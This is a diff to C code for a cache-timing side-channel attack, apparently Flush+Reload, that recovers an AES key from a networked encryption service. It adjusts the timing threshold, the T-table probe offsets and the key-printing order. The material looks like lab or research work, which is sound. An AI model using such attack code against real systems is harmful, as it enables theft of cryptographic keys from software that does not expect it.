@@ -9,7 +9,7 @@
 
 #define PORT 9090
 #define SA struct sockaddr
-#define MIN_CACHE_MISS_CYCLES (205)
+#define MIN_CACHE_MISS_CYCLES (190)
 #define NUMBER_OF_ENCRYPTIONS (40000)
 
 static const uint8_t sbox[256] =
@@ -102,7 +102,7 @@ void flushAttack(int sockfd)
 
     int i, j, k;
     unsigned int plaintext[16] = {0x54, 0x77, 0x6F, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x4E, 0x69, 0x6E, 0x65, 0x20, 0x54, 0x77, 0x6F};
-    unsigned int ciphertext[16];
+    unsigned int ciphertext[128];
     unsigned int restoredtext[128];
     unsigned int countKeyCandidates[16][256];
     unsigned int cacheMisses[16][256];
@@ -125,9 +125,11 @@ void flushAttack(int sockfd)
     uint64_t min_time = rdtsc();
     srand(min_time);
     sum = 0;
-    char *probe[] = {base + 0x40c0, base + 0x44c0, base + 0x48c0, base + 0x4cc0};
+    char *probe[] = {base + 0x2000, base + 0x2400, base + 0x2800, base + 0x2c00};
 
-    printf("\nT-table addresses...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", probe[0], probe[1], probe[2], probe[3]);
+    communicate(sockfd, plaintext, ciphertext);
+    for (i = 0; i < 16; i++)
+        printf("%X ", ciphertext[i]);
 
     for (k = 0; k < 4; k++)
     {
@@ -242,9 +244,8 @@ void flushAttack(int sockfd)
                     (((uint32_t)lastRoundKeyGuess[3]));
 
     uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
-    uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
-                         0x20000000, 0x10000000, 0x08000000, 0x04000000,
-                         0x02000000, 0x01000000};
+    uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000, 0x20000000,
+                         0x10000000, 0x08000000, 0x04000000, 0x02000000, 0x01000000};
     // loop to backtrack aes key expansion
     for (i = 0; i < 10; i++)
     {
@@ -262,7 +263,7 @@ void flushAttack(int sockfd)
         roundWords[0] = tempWord1;
     }
     printf("\nKey found from attack: ");
-    for (i = 3; i >= 0; i--)
+    for (i = 0; i < 4; i++)
     {
         printf("%X  ", roundWords[i]);
     }
